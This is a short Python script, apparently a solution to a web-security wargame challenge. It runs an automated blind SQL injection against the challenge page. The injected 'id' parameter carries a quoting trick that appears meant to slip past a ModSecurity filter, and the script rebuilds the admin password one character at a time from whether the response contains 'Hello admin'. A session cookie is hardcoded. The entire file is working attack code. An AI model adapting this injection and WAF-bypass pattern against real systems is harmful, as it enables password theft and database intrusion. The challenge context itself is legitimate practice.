import requests
import string

pw=""
a=string.printable
a=a[:-38]
url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
cookies = {'PHPSESSID':'sut3d29f5ijhgmlvbkei9ondvv'}
for i in range(1,9):
    url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
    for j in a:
        url="https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?id=-1%27%3C@=1%20OR%20id=%27admin%27%20and%20substr(pw,"+str(i)+",1)=\""+str(j)+"\"%20or%20%27&pw=a"
        res=requests.get(url,cookies=cookies)
        res=res.text
        if "Hello admin" in res:
            pw+=j
            break
        else: pass
print(pw)
    
